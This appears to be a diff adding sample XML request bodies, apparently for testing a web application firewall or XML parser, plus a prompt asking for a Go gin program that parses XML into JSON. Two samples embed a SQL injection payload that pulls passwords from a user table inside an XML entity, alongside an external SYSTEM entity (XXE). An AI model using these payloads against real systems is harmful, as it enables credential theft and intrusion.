@@ -1,0 +1,55 @@
+<!-- Request with everything -->
+
+POST /xml HTTP/1.1
+Host: localhost
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE BOOK [
+<!ENTITY writer "0 union select 'password is: ' || password from user limit 1 -- -">
+<!ENTITY author SYSTEM "https://waf.akhavani.net">
+]>
+<BOOK>
+<genre:schema xmlns:genre="http://localhost"> 
+  <genre:field1 attr="history">&gt;<!--this is a comment -->&writer;text</genre:field1>
+  <genre:field1 >nothing</genre:field2>
+</genre:schema>
+</BOOK>
+
+
+
+<!-- Request for gin-all -->
+
+<?xml version="1.0" encoding="UTF-8"?>
+ <!DOCTYPE BOOK [
+<!ENTITY writer "0 union select 'password is: ' || password from user limit 1 -- -">
+<!ENTITY author SYSTEM "https://waf.akhavani.net">
+]>
+<genre:schema xmlns:genre="http://localhost">
+  <genre:field1 attr="history">writer</genre:field1>
+  <genre:field2 attr="history">behx2</genre:field2>
+</genre:schema>
+
+
+
+<!-- another one -->
+POST /xml HTTP/1.1
+Host: localhost
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<BOOK>
+  <field1>&gt;<!--this is a comment -->writer</field1>
+  <field2>behx</field2>
+</BOOK>
+
+
+
+write me a golang program using gin web framework to parse a request body of content-type "application/xml" and return the parsed values in response as json. this is the request body:
+"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE BOOK [
+<!ENTITY writer "hello">
+]>
+<BOOK>
+  <field1>&writer</field1>
+</BOOK>"
